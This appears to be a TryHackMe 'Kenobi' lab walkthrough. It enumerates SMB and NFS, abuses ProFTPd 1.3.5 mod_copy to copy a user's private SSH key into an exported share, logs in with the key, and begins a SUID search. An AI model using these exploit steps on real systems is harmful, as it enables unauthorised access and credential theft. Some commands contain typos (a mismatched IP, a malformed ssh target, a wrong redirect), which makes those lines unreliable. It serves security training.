# Kenobi
* Access a Samba share, manipulate a vulnerable version of proftpd to gain initial access and escalate privileges to root via an SUID binary.
## Enumerate Samba for Shares
* Samba is standard Windows interoperabiliy suite for Linux.
* Allows users to access files, printers.
* AKA network file system.
* Based on client / server protocol of Server Message Block (SMB).
  * SMB only developed for Windows.
* SMB uses TCP/445 and TCP/139.

| Port | Usage
| --- | ---
| 139 | SMB originally ran on top of NetBIOS using port 139. NetBIOS is older transport layer that allows Windows to talk to another on same network.
| 445 | Later versions of SMB (after Windows 2000) use port 445 on top of TCP stack. Using TCP allows SMB to work over the Internet.

#### 1. Enumerate target for SMB Shares.
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN 10.10.233.83_smb_scan.nmap 10.10.233.83

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 09:16 GMT
Nmap scan report for 10.10.233.83
Host is up (0.023s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.233.83\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.233.83\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.233.83\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 4.55 seconds
```
* `smbclient` alreadt intalled on most Linux distributions.
#### 2. Inspect SMB share.
```
smbclient //10.10.233.83/anonymous
```
#### 3. Recursively download SMB share.
* Submit username and password as nothing.
```
smbget -R smb://10.10.233.83/anonymous

Password for [guest] connecting to //anonymous/10.10.233.83: 
Using workgroup WORKGROUP, user guest
smb://10.10.233.83/anonymous/log.txt                                            
Downloaded 11.95kB in 3 seconds
```
* Nmap port scan of target showed that TCP/111 is running `rpcbind` service.
* rpcbind is server that converts remote procedure call (RPC) program number into universal addresses.
* When RPC service is started it tells rpcbind the address at which it is listening and the RPC program number it is prepared to serve.
  * TCP/111 is access to NFS in this example.
#### 4. Use nmap scripts to enumerate NFS.
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.233.83

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836520.0  6877108.0  22%   16.0T        32000
MAC Address: 02:51:8B:05:9C:4F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
```
## Gain Initial Access with ProFtpd
* ProFtpd is OSS FTP server for Linux and Windows.
* Vulnerable in past software versions.
#### 1. Get version of ProFtpd using netcat.
```
nc 10.10.233.83 21

220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.233.83]
```
#### 2. Use searchsploit to find exploits
* Searchsploit is CLI search tool for exploit-db.com
```
searchsploit proftpd 1.3.5
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution  | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                     | linux/remote/36742.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
``` 
* ProFtpd 1.3.5 [mod_copy module](http://www.proftpd.org/docs/contrib/mod_copy.html) vulnerable to exploit.
* mod_copy implements **SITE CPFR** and **SITE CPTO** commands.
* Unauthenticated client can use commands to copy files from remote filesystem to chosen destination.
* log.txt shows that FTP service is running as `Kenobi` user in this example.
```
# Set the user and group under which the server will run.
User				kenobi
Group				kenobi
```
* log.txt shows that SSH key generated for Kenobi user.
```
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
```
#### 3. Copy Private key Using SITE CPFR and SITE CPTO Commands.
```
nc 10.10.233.83 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.233.83]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
```
* Earlier nmap NFS enumeration scan showed that `/var` directory is mounted.
* Copy Kenobi user's private key to `/var/tmp` directory.
```
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```
#### 4. Mount `/var/tmp` Directory
* Create network mount.
```
mkdir /mnt/kenobi_nfs
mount 10.10.233.82:/var /mnt/kenobi_nfs
ls -la /mnt/kenobi_nfs
```
#### 5. Get Private Key.
```
cp /mnt/kenobi_nfs/tmp/id_rsa .
sudo chmod 600 id_rsa
```
#### 6. Login to Kenobi user's account.
```
ssh -i id_rsa kenobi_10.10.233.83
```
 * `-i` selects identify file (private key). 
## Privilege Escalation with Path Variable Manipulation
* ![LN2uOCJ](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/ae6edfe3-b630-4eef-abd2-811750f7e0e2)

| Permission | On Files | On Directories
| --- | --- | ---
| SUID bit | User executes file with permissions of *file* owner. |
| SGID bit | User executes file with permission of *group* owner. | File created in directory gets the same group owner.
| Sticky bit | No meaning | Users are prevented from deleting files from other users.

* SUID bits can be dangerous.
* Some binaries such as `passwd` must be run with elevated privileges to rest a user's password.
* Other custom files with SUID bit set can lead to issues.
* Search system for binaries with SUID bit set.
```
find / -perm -u=s -type f >2/dev/null
```
